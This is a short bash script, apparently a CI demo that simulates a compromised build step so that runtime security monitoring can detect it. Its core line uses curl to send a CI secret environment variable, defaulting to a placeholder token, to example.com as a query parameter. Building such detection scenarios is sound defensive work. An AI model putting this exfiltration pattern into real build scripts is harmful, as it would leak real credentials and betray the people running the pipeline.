#!/usr/bin/env bash
set -euo pipefail

echo "::group::Fake secret exfiltration"
echo "This simulates a compromised build step or dependency script sending a CI secret over the network."

workspace="${RUNNER_TEMP:-/tmp}/tetragon-ci"
mkdir -p "$workspace"
printf 'normal-looking build output\n' > "$workspace/build.txt"

fake_secret="${CI_DEMO_SECRET:-demo-token-not-a-real-secret}"

echo "Attempting to exfiltrate a fake CI secret over the network..."
curl -fsS --max-time 10 "https://example.com/?ci_demo_secret=${fake_secret}" >/dev/null

echo "Fake secret exfiltration scenario completed."
echo "::endgroup::"
